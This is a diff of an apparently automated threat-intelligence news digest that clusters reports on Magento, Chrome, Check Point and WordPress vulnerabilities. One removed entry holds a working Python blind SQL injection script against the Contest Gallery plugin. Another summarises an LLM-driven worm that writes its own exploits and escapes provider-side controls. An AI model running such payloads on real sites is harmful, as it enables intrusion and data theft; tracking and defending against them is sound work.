-The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted
-```
-
-#### Full body
-
-```
-CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog  Ravie Lakshmanan  Jun 03, 2026 Web Security / Vulnerability The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted data that could be exploited to execute arbitrary PHP code on an affected server. "Mirasvit Full Page Cache Warmer contains a deserialization of untrusted data vulnerability that could allow unauthenticated attackers to achieve remote code execution by supplying a crafted serialized PHP object in the CacheWarmer cookie," CISA said . The shortcoming impacts all versions of the extension prior to version 1.11.12. Patches for the were released on May 25, 2026. The addition of CVE-2026-45247 to the KEV catalog comes days after Sansec said the PHP object injection vulnerability could be exploited by means of any storefront request carrying a crafted CacheWarmer cookie, which then deserializes part of the cookie value with PHP's native unserialize() function without requiring any authentication or admin privileges. "Because that value comes straight from the client, an attacker controls the objects PHP reconstructs," the Dutch security company said . "This is PHP object injection (CWE-502). Combined with a gadget chain from classes that Magento and its dependencies already ship, object injection escalates to remote code execution." Sansec said it identified about 6,000 stores running Mirasvit extensions, although the exact number is likely to be higher given that content delivery networks (CDNs) like Cloudflare mask installs. Thales-owned Imperva has since disclosed it has observed active attack activity attempting to exploit CVE-2026-45247 through serialized PHP object payloads delivered via malicious HTTP requests. "Observed payloads contain base64-encoded serialized objects designed to trigger PHP Object Deserialization and achieve remote code execution through commonly abused gadget chains," the company said . "The payloads attempt to invoke functions such as system() and current() to execute arbitrary commands on the underlying server. In several observed cases, attackers used test commands designed to validate successful code execution." The activity has primarily singled out gaming and business sites, with the U.S., the U.K., France, and Australia emerging as the most targeted countries. It's currently not known who is behind the exploitation efforts, although the end goal appears to be to flag vulnerable Magento environments and confirm remote code execution is possible. In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies have been ordered to apply the fixes by June 6, 2026. To detect potential exploitation efforts, site owners are advised to audit for storefront requests that carry a CacheWarmer cookie whose value contains the marker "CacheWarmer:" followed by a Base64-encoded string. "Serialized PHP objects base64-encode to values starting with Tz, Qz or YT, so a CacheWarmer cookie value matching CacheWarmer:(Tz|Qz|YT) is a strong indicator of an exploitation attempt," Sansec added. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cybersecurity , Imperva , Magento , PHP , remote code execution , Vulnerability , Web Security ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Cr
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog
-  - Published: 2026-06-03T16:30:00+00:00
-  - Link: https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
-  - Summary: The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Wednesday added a critical flaw impacting Mirasvit Cache Warmer, a popular Magento full-page cache extension, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation in the wild. The vulnerability, tracked as CVE-2026-45247 (CVSS score: 9.8), is a case of deserialization of untrusted
-
 ### Cluster ce8fdc8c42 — score 20
 
 - Title: [webapps] WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-06-05T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52609
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 3
 - Corroborating source count: 3
 - Strong signals: WordPress
@@ -1369,13 +1349,13 @@ CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog  Ravie Lak
 #### Cluster taxonomy (union across members)
 - affected_products: WordPress
 - cve_ids: CVE-2026-3300
-- urgency_signals: poc_available, preauth_unauth
+- urgency_signals: preauth_unauth
 - content_type: news_report, vulnerability_disclosure
 - confidence_tier: tier_1_offensive_research, tier_4_news
 
 #### Primary article taxonomy
 - affected_products: WordPress
-- urgency_signals: preauth_unauth, poc_available
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -1383,12 +1363,6 @@ CISA Adds Exploited Magento RCE Flaw CVE-2026-45247 to KEV Catalog  Ravie Lak
 
 ```
 WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection EDB-ID: 52609 CVE: 2026-3180 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: Multiple Date: 2026-06-05 Vulnerable App: # Exploit Title: WordPress Contest Gallery 28.1.4 - Unauthenticated Blind SQL Injection # Google Dork: N/A # Date: 2026-06-02 # Exploit Author: cardosource # Vendor Homepage: https://contest-gallery.com/ # Software Link: https://wordpress.org/plugins/contest-gallery/ # Version: <= 28.1.4 # Tested on: Docker - PHP 8.2/Apache + MariaDB (WordPress Environment) # CVE: 2026-3180 """ Description A Blind SQL Injection vulnerability exists in Contest Gallery versions 28.1.4 and earlier. The issue is caused by the unsafe use of the cgl_maili parameter, where sanitize_email() preserves the single quote (') character in the local part of an email address. As a result, user-controlled input reaches wpdb->get_row() without proper parameterization via prepare(), allowing unauthenticated attackers to perform boolean-based blind SQL injection. Authentication Required: No """ import requests import json NONCE = " " URL = "http://localhost:8080/wp-admin/admin-ajax.php" endpoint = "/wp-admin/admin-ajax.php" url = "http://localhost:8080/" payload = "'OR/**/1=1#@teste.com' and 'OR/**/1=2#@teste.com" def send_payload(mail): data = { "action": "post_cg1l_resend_unconfirmed_mail_frontend", "cgl_mail": mail, "cgl_page_id": "1", "cgl_activation_key": "", "cg_nonce": NONCE, } return requests.post(URL, data=data) r_true = send_payload("qualquer'OR/**/1=1#@teste.com") if r_true.status_code == 200: status_code = r_true.status_code banner = f""" CVE : 2026-3180 | Contest Gallery 28.1.4 : Boolean SQLi payload :........................{payload} end point :........................{endpoint} url :..............................{url} status :...........................{status_code} nonce :............................{NONCE} """ print(banner) print(f"Body length: {len(r_true.text)} chars") poc =f'''\nmariadb wordpress_db -e " SELECT * FROM wp_contest_gal1ery_create_user_entries ORDER BY Tstamp DESC LIMIT 1115;"''' print(poc) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
 ```
 
 #### Corroborating sources (3)
@@ -1469,45 +1443,6 @@ Threat Intelligence Seeking Counsel: Ongoing Targeted Campaign Against US Law Fi
   - Link: https://thehackernews.com/2026/06/unc3753-used-vishing-and-physical.html
   - Summary: Cybersecurity researchers have disclosed details of a financially motivated data theft extortion campaign that has targeted dozens of organizations across professional, legal, and financial services in the U.S. between January and May 2026. The activity has been attributed by Google Mandiant and Google Threat Intelligence Group (GTIG) to a threat actor dubbed UNC3753, which is also known as
 
-### Cluster a7427d9735 — score 19
-
-- Title: TeamPCP Supply Chain Campaign: Activity Through 2026-06-07, (Mon, Jun 8th)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-06-08T17:07:37+00:00
-- Link: https://isc.sans.edu/diary/rss/33060
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: TeamPCP
-
-#### Cluster taxonomy (union across members)
-- threat_categories: supply_chain
-- actor_attribution: TeamPCP
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- threat_categories: supply_chain
-- actor_attribution: TeamPCP
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-This diary continues the Internet Storm Center&#;x26;#;39;s tracking of the TeamPCP supply chain campaign, first documented in the SANS white paper When the Security Scanner Became the Weapon and most recently in the handler diary Activity Through 2026-05-24 . Since that update, the story moved into two new places: the United States government, which formally caught up to the campaign, and the wider population of attackers now wielding the Mini Shai-Hulud framework that TeamPCP open-sourced last month.
-```
-
-#### Corroborating sources (1)
-
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: TeamPCP Supply Chain Campaign: Activity Through 2026-06-07, (Mon, Jun 8th)
-  - Published: 2026-06-08T17:07:37+00:00
-  - Link: https://isc.sans.edu/diary/rss/33060
-  - Summary: This diary continues the Internet Storm Center&#;x26;#;39;s tracking of the TeamPCP supply chain campaign, first documented in the SANS white paper When the Security Scanner Became the Weapon and most recently in the handler diary Activity Through 2026-05-24 . Since that update, the story moved into two new places: the United States government, which formally caught up to the campaign, and the wider population of attackers now wielding the Mini Shai-Hulud framework that TeamPCP open-sourced last month.
-
 ### Cluster 001d61d9b2 — score 19
 
 - Title: CVE-2026-44825 | Apache Solr AuthTool Hardcoded Credentials Vulnerability
@@ -1554,53 +1489,6 @@ CVE-2026-44825 Apache Solr AuthTool Hardcoded Credentials Vulnerability CVE-2026
   - Published: 2026-06-02T20:15:53+00:00
   - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
   - Summary: CVE-2026-44825 is a hardcoded credentials vulnerability affecting Apache Solr Basic Authentication setup workflows. The flaw may allow attackers to gain administrative access to vulnerable SolrCloud deployments.
-
-### Cluster a986419b22 — score 19
-
-- Title: Google patches new Chrome zero-day flaw exploited in the wild
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-06-09T06:56:27+00:00
-- Link: https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, zero_day
-- affected_products: Gogs
-- cve_ids: CVE-2024-0519, CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day, active_exploitation
-- affected_products: Gogs
-- cve_ids: CVE-2026-11645, CVE-2024-0519, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Google has released emergency updates to patch another Chrome zero-day vulnerability that has been exploited in the wild, the fifth such flaw patched since the start of the year. [...]
-```
-
-#### Full body
-
-```
-Google patches new Chrome zero-day flaw exploited in the wild By Sergiu Gatlan June 9, 2026 02:56 AM 0 Google has released emergency updates to patch another Chrome zero-day vulnerability that has been exploited in the wild, the fifth such flaw patched since the start of the year. "Google is aware that an exploit for CVE-2026-11645 exists in the wild," the company said in a Monday security advisory . The company fixed the zero-day for users in the Stable Desktop channel, with patched versions rolling out worldwide to Windows (149.0.7827.102), Mac (149.0.7827.103), and Linux (149.0.7827.102) systems two weeks after an anonymous security researcher reported it to Google. While Google says the security update could take days or weeks to reach all Chrome users, the update was available immediately when BleepingComputer checked for updates earlier today. Users who prefer not to manually update their web browser can rely on Chrome to automatically check for updates and install them during the next launch. ​This high-severity zero-day vulnerability ( CVE-2026-11645 ) stems from an out-of-bounds read and write weakness in the Chrome V8 JavaScript engine, which remote attackers can exploit via crafted HTML pages to execute arbitrary code inside the web browser's sandbox. Successful exploitation enables them to access data beyond the memory buffer via heap corruption, exposing sensitive information or triggering a crash. Besides unauthorized access to out-of-bounds memory, the now-patched zero-day bug could also be exploited to bypass protection mechanisms such as ASLR, making it easier to achieve code execution via another weakness. While Google said it was aware of CVE-2024-0519 zero-day exploits used in attacks, the company has not yet shared further details about these incidents. "Access to bug details and links may be kept restricted until a majority of users are updated with a fix," Google said. "We will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven't yet fixed." Since the start of the year, Google addressed four more zero-days exploited in attacks: An iterator invalidation bug (CVE-2026-2441) in CSSFontFeatureValuesMap (Chrome's implementation of CSS font feature values), which Google addressed in mid-February . Two other Chrome zero-day bugs exploited in attacks in March: an out-of-bounds write weakness in the Skia 2D graphics library (CVE-2026-3909), and an inappropriate implementation vulnerability in the V8 JavaScript and WebAssembly engine (CVE-2026-3910). And a use-after-free weakness in Dawn (CVE-2026-5281), the underlying cross-platform implementation of the WebGPU standard used by the Chromium project, which Google patched in April . Last year, Google fixed another eight zero-days exploited in the wild , many of them reported by the company's Threat Analysis Group (TAG), which is known for identifying and tracking zero-day exploits used in spyware attacks. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Google Chrome adds session cookie theft protection for all users Google fixes one actively exploited Android zero-day, 124 flaws Google accidentally exposed details of unfixed Chromium flaw Google now offers up to $1.5 million for some Android exploits New Gogs zero-day flaw lets hackers get remote code execution
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Google patches new Chrome zero-day flaw exploited in the wild
-  - Published: 2026-06-09T06:56:27+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
-  - Summary: Google has released emergency updates to patch another Chrome zero-day vulnerability that has been exploited in the wild, the fifth such flaw patched since the start of the year. [...]
 
 ### Cluster 9f943550b8 — score 19
 
@@ -1690,6 +1578,92 @@ This one breaks a core assumption about worm containment. Traditional worms have
   - Link: https://www.reddit.com/r/cybersecurity/comments/1u17y7b/university_of_toronto_proofofconcept_ai_worm/
   - Summary: This one breaks a core assumption about worm containment. Traditional worms have a fixed exploit payload. Patch those bugs and propagation stops. This worm reads live public advisories at runtime and generates new attack logic tailored to whatever it finds on the next target. Patch one hole, it picks another. It ran on a free open-weight LLM on a single GPU with no API keys and no cloud dependency. Across 15 runs on a 33-host isolated network it gained elevated access on 23 hosts and replicated to 62% of the network in 7 days with no human input. It exploited three CVEs disclosed after the model was trained, including CVE-2026-39987, a pre-auth RCE in Marimo (CVSS 9.3) that was exploited in the wild 9 hours after disclosure. Once it compromises a GPU-capable host it routes inference through that machine for lower-compute devices on the same subnet. One compromised deep-learning server becomes a reasoning hub for the whole network. And because it runs entirely locally, provider-side con
 
+### Cluster a7427d9735 — score 18
+
+- Title: TeamPCP Supply Chain Campaign: Activity Through 2026-06-07, (Mon, Jun 8th)
+- Source: SANS Internet Storm Center (government_authoritative)
+- Published: 2026-06-08T17:07:37+00:00
+- Link: https://isc.sans.edu/diary/rss/33060
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: TeamPCP
+
+#### Cluster taxonomy (union across members)
+- threat_categories: supply_chain
+- actor_attribution: TeamPCP
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- threat_categories: supply_chain
+- actor_attribution: TeamPCP
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+This diary continues the Internet Storm Center&#;x26;#;39;s tracking of the TeamPCP supply chain campaign, first documented in the SANS white paper When the Security Scanner Became the Weapon and most recently in the handler diary Activity Through 2026-05-24 . Since that update, the story moved into two new places: the United States government, which formally caught up to the campaign, and the wider population of attackers now wielding the Mini Shai-Hulud framework that TeamPCP open-sourced last month.
+```
+
+#### Corroborating sources (1)
+
+- **SANS Internet Storm Center** (government_authoritative)
+  - Title: TeamPCP Supply Chain Campaign: Activity Through 2026-06-07, (Mon, Jun 8th)
+  - Published: 2026-06-08T17:07:37+00:00
+  - Link: https://isc.sans.edu/diary/rss/33060
+  - Summary: This diary continues the Internet Storm Center&#;x26;#;39;s tracking of the TeamPCP supply chain campaign, first documented in the SANS white paper When the Security Scanner Became the Weapon and most recently in the handler diary Activity Through 2026-05-24 . Since that update, the story moved into two new places: the United States government, which formally caught up to the campaign, and the wider population of attackers now wielding the Mini Shai-Hulud framework that TeamPCP open-sourced last month.
+
+### Cluster a986419b22 — score 18
+
+- Title: Google patches new Chrome zero-day flaw exploited in the wild
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-06-09T06:56:27+00:00
+- Link: https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, zero_day
+- affected_products: Gogs
+- cve_ids: CVE-2024-0519, CVE-2026-11645, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, active_exploitation
+- affected_products: Gogs
+- cve_ids: CVE-2026-11645, CVE-2024-0519, CVE-2026-2441, CVE-2026-3909, CVE-2026-3910
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Google has released emergency updates to patch another Chrome zero-day vulnerability that has been exploited in the wild, the fifth such flaw patched since the start of the year. [...]
+```
+
+#### Full body
+
+```
+Google patches new Chrome zero-day flaw exploited in the wild By Sergiu Gatlan June 9, 2026 02:56 AM 0 Google has released emergency updates to patch another Chrome zero-day vulnerability that has been exploited in the wild, the fifth such flaw patched since the start of the year. "Google is aware that an exploit for CVE-2026-11645 exists in the wild," the company said in a Monday security advisory . The company fixed the zero-day for users in the Stable Desktop channel, with patched versions rolling out worldwide to Windows (149.0.7827.102), Mac (149.0.7827.103), and Linux (149.0.7827.102) systems two weeks after an anonymous security researcher reported it to Google. While Google says the security update could take days or weeks to reach all Chrome users, the update was available immediately when BleepingComputer checked for updates earlier today. Users who prefer not to manually update their web browser can rely on Chrome to automatically check for updates and install them during the next launch. ​This high-severity zero-day vulnerability ( CVE-2026-11645 ) stems from an out-of-bounds read and write weakness in the Chrome V8 JavaScript engine, which remote attackers can exploit via crafted HTML pages to execute arbitrary code inside the web browser's sandbox. Successful exploitation enables them to access data beyond the memory buffer via heap corruption, exposing sensitive information or triggering a crash. Besides unauthorized access to out-of-bounds memory, the now-patched zero-day bug could also be exploited to bypass protection mechanisms such as ASLR, making it easier to achieve code execution via another weakness. While Google said it was aware of CVE-2024-0519 zero-day exploits used in attacks, the company has not yet shared further details about these incidents. "Access to bug details and links may be kept restricted until a majority of users are updated with a fix," Google said. "We will also retain restrictions if the bug exists in a third party library that other projects similarly depend on, but haven't yet fixed." Since the start of the year, Google addressed four more zero-days exploited in attacks: An iterator invalidation bug (CVE-2026-2441) in CSSFontFeatureValuesMap (Chrome's implementation of CSS font feature values), which Google addressed in mid-February . Two other Chrome zero-day bugs exploited in attacks in March: an out-of-bounds write weakness in the Skia 2D graphics library (CVE-2026-3909), and an inappropriate implementation vulnerability in the V8 JavaScript and WebAssembly engine (CVE-2026-3910). And a use-after-free weakness in Dawn (CVE-2026-5281), the underlying cross-platform implementation of the WebGPU standard used by the Chromium project, which Google patched in April . Last year, Google fixed another eight zero-days exploited in the wild , many of them reported by the company's Threat Analysis Group (TAG), which is known for identifying and tracking zero-day exploits used in spyware attacks. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Google Chrome adds session cookie theft protection for all users Google fixes one actively exploited Android zero-day, 124 flaws Google accidentally exposed details of unfixed Chromium flaw Google now offers up to $1.5 million for some Android exploits New Gogs zero-day flaw lets hackers get remote code execution
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Google patches new Chrome zero-day flaw exploited in the wild
+  - Published: 2026-06-09T06:56:27+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
+  - Summary: Google has released emergency updates to patch another Chrome zero-day vulnerability that has been exploited in the wild, the fifth such flaw patched since the start of the year. [...]
+
 ### Cluster 52c396ff87 — score 18
 
 - Title: Check Point VPN Zero-Day Exploited in Qilin Ransomware Attacks
@@ -1705,8 +1679,8 @@ This one breaks a core assumption about worm containment. Traditional worms have
 - threat_categories: active_exploitation, data_breach, ransomware_extortion, supply_chain, zero_day
 - actor_attribution: Silent Ransom Group
 - affected_industries: education, government
-- affected_products: SolarWinds, WordPress
-- tools_used: Anthropic/Claude, PyPI, npm
+- affected_products: Anthropic/Claude, SolarWinds, WordPress
+- tools_used: PyPI, npm
 - cve_ids: CVE-2026-50751, CVE-2026-50752
 - urgency_signals: actively_exploited, poc_available, zero_day
 - content_type: incident_report
@@ -1716,8 +1690,8 @@ This one breaks a core assumption about worm containment. Traditional worms have
 - threat_categories: ransomware_extortion, supply_chain, zero_day, data_breach, active_exploitation
 - actor_attribution: Silent Ransom Group
 - affected_industries: government, education
-- affected_products: SolarWinds, WordPress
-- tools_used: Anthropic/Claude, npm, PyPI
+- affected_products: Anthropic/Claude, SolarWinds, WordPress
+- tools_used: npm, PyPI
 - cve_ids: CVE-2026-50751, CVE-2026-50752
 - urgency_signals: actively_exploited, zero_day, poc_available
 - content_type: incident_report
@@ -1732,7 +1706,7 @@ The authentication bypass vulnerability allows attackers to establish VPN connec
 #### Full body
 
 ```
-Check Point on Monday warned that a critical-severity authentication bypass vulnerability affecting its VPN and firewall products has been exploited in the wild as a zero-day. Tracked as CVE-2026-50751 (CVSS score of 9.3), the security defect is described as a logic flow weakness in the validation process of Remote Access and Mobile Access certificates. It exists in the deprecated IKEv1 key exchange and allows remote attackers to establish VPN sessions without a valid password. According to Check Point, the vulnerability has been exploited in the wild since May 7, with activity surrounding it increasing in early June. “To date, the observed exploitation has been limited to a few dozen targeted organizations globally,” the company notes in its advisory . Check Point also says that at least one attack was confirmed to have been mounted by a Qilin ransomware affiliate. Advertisement. Scroll to continue reading. “Based on the post-exploitation activity we observed, we assess with medium confidence that the actor behind the exploitation of CVE-2026-50751 is financially motivated and uses Qilin ransomware. We believe that this threat actor infrastructure is exploiting other VPN related vulnerabilities such as the ones published by Palo Alto, Fortinet and F5,” Check Point notes. While investigating the security bug, the company identified a second issue in the IKEv1 key exchange’s certificate validation logic. Tracked as CVE-2026-50752, it allows attackers to mount man-in-the-middle attacks on VPN site-to-site connections, but has not been exploited in the wild. Check Point has released hotfixes for the vulnerable appliances to address both CVEs, as well as indicators of compromise (IoCs) and mitigation guidance. On Monday, the US cybersecurity agency CISA added CVE-2026-50751 to its Known Exploited Vulnerabilities (KEV) catalog, urging federal agencies to patch it by June 11. Related: Google Patches 5th Chrome Zero-Day Exploited in 2026 Related: Everest Forms Vulnerability Exploited to Hack WordPress Sites Related: SolarWinds Serv-U Vulnerability Exploited in the Wild Related: Cisco Warns of Available PoC for Critical Unified CM Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Everest Forms Vulnerability Exploited to Hack WordPress Sites 174,000 Impacted by Lansing Community College Data Breach Silent Ransom Group Uses DNS Fast Flux in Attacks SolarWinds Serv-U Vulnerability Exploited in the Wild Emphere Raises $2.1 Million for AI-Powered Vulnerability Remediation Opal Security Raises $23 Million for AI-Native Identity Governance Hackers Leak DentaQuest Information Impacting 2.6 Million Chrome 149 Patches 429 Vulnerabilities Latest News Claude Mythos Turns N-Days Into N-Hours With Rapid Exploit Creation New Platform Uses Cryptographic Invisibility to Protect AI-Built Applications SAP Patches Critical NetWeaver, Commerce Vulnerabilities Over 100 NPM, PyPI Packages Hit in New Shai-Hulud Supply Chain Attacks Will AI Kill the Bug Bounty Industry? Google Patches 5th Chrome Zero-Day Exploited in 2026 A Security Raises $37 Million for Autonomous Offensive Security Platform Everybody Is Vibe Coding But Nobody Told the Security Team Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Third-Party Risk in Practice June 4, 2026 Organizations are investing heavily in third-party risk management, but breaches, delays, and blind spots continue to persist. Join this live webinar as we examine the gap between how organizations think their third-party risk programs are performing and what’s actually happening in practice. Register Virtual Roundtable: CISO Forum 2026 Mid-Year Review Jun
+Check Point on Monday warned that a critical-severity authentication bypass vulnerability affecting its VPN and firewall products has been exploited in the wild as a zero-day. Tracked as CVE-2026-50751 (CVSS score of 9.3), the security defect is described as a logic flow weakness in the validation process of Remote Access and Mobile Access certificates. It exists in the deprecated IKEv1 key exchange and allows remote attackers to establish VPN sessions without a valid password. According to Check Point, the vulnerability has been exploited in the wild since May 7, with activity surrounding it increasing in early June. “To date, the observed exploitation has been limited to a few dozen targeted organizations globally,” the company notes in its advisory . Check Point also says that at least one attack was confirmed to have been mounted by a Qilin ransomware affiliate. Advertisement. Scroll to continue reading. “Based on the post-exploitation activity we observed, we assess with medium confidence that the actor behind the exploitation of CVE-2026-50751 is financially motivated and uses Qilin ransomware. We believe that this threat actor infrastructure is exploiting other VPN related vulnerabilities such as the ones published by Palo Alto, Fortinet and F5,” Check Point notes. While investigating the security bug, the company identified a second issue in the IKEv1 key exchange’s certificate validation logic. Tracked as CVE-2026-50752, it allows attackers to mount man-in-the-middle attacks on VPN site-to-site connections, but has not been exploited in the wild. Check Point has released hotfixes for the vulnerable appliances to address both CVEs, as well as indicators of compromise (IoCs) and mitigation guidance. On Monday, the US cybersecurity agency CISA added CVE-2026-50751 to its Known Exploited Vulnerabilities (KEV) catalog, urging federal agencies to patch it by June 11. Related: Google Patches 5th Chrome Zero-Day Exploited in 2026 Related: Everest Forms Vulnerability Exploited to Hack WordPress Sites Related: SolarWinds Serv-U Vulnerability Exploited in the Wild Related: Cisco Warns of Available PoC for Critical Unified CM Vulnerability Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Everest Forms Vulnerability Exploited to Hack WordPress Sites 174,000 Impacted by Lansing Community College Data Breach Silent Ransom Group Uses DNS Fast Flux in Attacks SolarWinds Serv-U Vulnerability Exploited in the Wild Emphere Raises $2.1 Million for AI-Powered Vulnerability Remediation Opal Security Raises $23 Million for AI-Native Identity Governance Hackers Leak DentaQuest Information Impacting 2.6 Million Chrome 149 Patches 429 Vulnerabilities Latest News Microsoft Patches 200 Vulnerabilities Adobe Patches 123 Vulnerabilities Anthropic Launches Claude Fable 5: Mythos-Class AI With Cybersecurity Guardrails OpenSSL Patches High-Severity Vulnerability Found With AI Claude Mythos Turns N-Days Into N-Hours With Rapid Exploit Creation New Platform Uses Cryptographic Invisibility to Protect AI-Built Applications SAP Patches Critical NetWeaver, Commerce Vulnerabilities Over 100 NPM, PyPI Packages Hit in New Shai-Hulud Supply Chain Attacks Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Third-Party Risk in Practice June 4, 2026 Organizations are investing heavily in third-party risk management, but breaches, delays, and blind spots continue to persist. Join this live webinar as we examine the gap between how organizations think their third-party risk programs are performing and what’s actually happening in practice. Register Virtual Roundtable: CISO Forum 2026 Mid-Year Review June 10, 2026 E
 ```
 
 #### Corroborating sources (1)
@@ -1755,22 +1729,22 @@ Check Point on Monday warned that a critical-severity authentication bypass vuln
 - Strong signals: CVE-2026-28318, SolarWinds
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, cryptojacking, ddos, mfa_bypass, phishing_social_eng, ransomware_extortion, supply_chain, vulnerability_disclosure, zero_day
+- threat_categories: active_exploitation, ddos, ransomware_extortion, supply_chain, vulnerability_disclosure, zero_day
 - actor_attribution: Cl0p
 - affected_industries: government
-- affected_products: Microsoft SharePoint, Palo Alto Networks, SolarWinds
-- cve_ids: CVE-2024-21182, CVE-2026-0257, CVE-2026-28318, CVE-2026-39987, CVE-2026-45659
-- urgency_signals: actively_exploited, zero_day
+- affected_products: GitHub, Microsoft 365, SolarWinds
+- cve_ids: CVE-2026-11645, CVE-2026-20230, CVE-2026-23479, CVE-2026-28318
+- urgency_signals: actively_exploited, no_patch_yet, zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, ddos, cryptojacking, mfa_bypass, vulnerability_disclosure, active_exploitation
+- threat_categories: ransomware_extortion, supply_chain, zero_day, ddos, vulnerability_disclosure, active_exploitation
 - actor_attribution: Cl0p
